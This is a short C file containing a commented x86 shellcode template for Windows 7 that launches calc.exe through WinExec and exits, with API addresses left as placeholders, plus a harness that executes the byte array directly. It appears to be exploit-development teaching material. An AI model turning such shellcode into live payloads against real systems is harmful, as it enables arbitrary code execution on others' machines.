/*
 * Shellcode API Static Address
 * WinExec(Calc.exe,0); ExitProcess(0);
 * Windows 7 Home Premium Service Pack 1 x86_64
 * 0xXX mean FILL IN with static little endian API address 
 */
#include<stdio.h>
#include<string.h>

unsigned char payload[] =
"\xEB\x16"             // JMP SHORT 0x16
"\x5B"                 // POP EBX
"\x31\xC0"             // XOR EAX,EAX
"\x50"                 // PUSH EAX
"\x53"                 // PUSH EBX
"\xBB\xXX\xXX\xXX\xXX" // MOV EBX, 0xXX ;kernel32.dll!WinExec
"\xFF\xD3"             // CALL EBX
"\x31\xC0"             // XOR EAX,EAX
"\x50"                 // PUSH EAX
"\xBB\xXX\xXX\xXX\xXX" // MOV EBX, 0xXX ;kernel32.dll!ExitProcess
"\xFF\xD3"             // CALL EBX
"\xE8\xE5\xFF\xFF\xFF" // CALL 0xE5FFFFFF
"\x63\x61\x6C\x63\x2E\x65\x78\x65";// ASCII "calc.exe"

void main() {
printf("Shellcode Length: %d\n", strlen(payload));
(*(void (*)()) payload)();
}